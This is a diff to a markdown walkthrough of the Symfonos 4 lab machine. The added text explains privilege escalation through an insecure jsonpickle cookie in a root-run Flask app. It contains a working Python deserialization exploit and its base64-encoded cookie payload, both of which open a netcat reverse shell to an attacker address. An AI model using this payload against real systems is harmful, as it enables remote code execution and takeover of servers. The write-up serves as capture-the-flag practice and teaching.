@@ -155,7 +155,7 @@ boom we got a reverse shell
 
 ![image](https://user-images.githubusercontent.com/87468669/219977645-665baf93-6e36-4a0a-92c1-e3e56abb9db6.png)
 
-checking the process running as root, we can see a local server running on port 8080
+If we run `ps aux` we’ll be able to see that there is app running on `8080` as `root`.
 
 ![image](https://user-images.githubusercontent.com/87468669/219980284-2a12644f-013a-4928-80c8-b78a299d18cc.png)
 
@@ -191,6 +191,10 @@ poseidon@symfonos4:~$
 ![image](https://user-images.githubusercontent.com/87468669/219981459-bc272465-be60-4459-abf9-4cf194ef077e.png)
 
 opening the forwarded port on a broswer, we got a webpage.
+
+![image](https://user-images.githubusercontent.com/87468669/219998536-ea04bde4-9bad-4c6b-a9f8-b914ce65b1ee.png)
+
+And If we open /whoami we see `poseidon`. let's check the source codewhich is loctated in the `/opt/code/app.py`
 
 ```
 poseidon@symfonos4:/opt/code$ cat app.py
@@ -231,8 +235,36 @@ def whoami():
 if __name__ == '__main__':
     app.run()
 ```
+We can see that it takes the cookie and see the username from it. let's search for jsonpickle exploit.
 
+```
+import base64
+import jsonpickle
+import os
 
+class RCE:
+        def __reduce__(self):
+                return os.system, ("nc -c /bin/bash 192.168.0.101 1337",)
 
+malware_obj = RCE()
+serialized_malware_obj = jsonpickle.encode(malware_obj)
+serialized_malware_obj = serialized_malware_obj.encode('ascii')
+b64_malware_obj = base64.b64encode(serialized_malware_obj)
+b64_malware_obj
 
+print(b64_malware_obj)
+```
+create a malicious json cookie using python.
+
+```
+eyJweS9yZWR1Y2UiOiBbeyJweS9mdW5jdGlvbiI6ICJwb3NpeC5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsibmMgLWMgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xMDEgMTMzNyJdfV19
+```
+
+![image](https://user-images.githubusercontent.com/87468669/220004117-ca15d540-36be-4326-ac81-1618d23cd228.png)
+
+replace the username cookie value with our malicious value and boom we got a shell as `root`
+
+![image](https://user-images.githubusercontent.com/87468669/220004513-ee02d2dd-55cc-41d0-ab2d-11ca69ca1854.png)
+
+and we are through.
 
